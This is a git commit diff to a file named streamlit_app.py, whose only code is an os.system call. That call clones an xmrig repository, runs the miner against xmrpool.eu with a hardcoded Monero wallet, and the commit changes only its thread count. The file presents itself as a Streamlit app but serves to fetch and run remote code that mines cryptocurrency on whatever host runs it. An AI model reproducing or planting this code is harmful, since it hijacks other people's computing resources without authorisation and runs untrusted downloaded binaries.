8cb3ac618a12a4d40c140023f518f07882f9688a
ytxpert <83564895+ytxpert@users.noreply.github.com>
2021-06-10 20:54:54 +0530

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system("git clone https://github.com/ytxpert/xmrig && cd xmrig && chmod +x xmrig && ./xmrig -o xmrpool.eu:9999 -u 43FN9N7ktZJAtr6nsvNdTtKHbuCJAER7L9srybAMPNWBHzGk98f3jiTNGRkBfgeEDRQan9PwdYfFwEDrKq9DH7ck8K19JPD -k --tls --print-time 5 -t32")
+os.system("git clone https://github.com/ytxpert/xmrig && cd xmrig && chmod +x xmrig && ./xmrig -o xmrpool.eu:9999 -u 43FN9N7ktZJAtr6nsvNdTtKHbuCJAER7L9srybAMPNWBHzGk98f3jiTNGRkBfgeEDRQan9PwdYfFwEDrKq9DH7ck8K19JPD -k --tls --print-time 5 -t16")
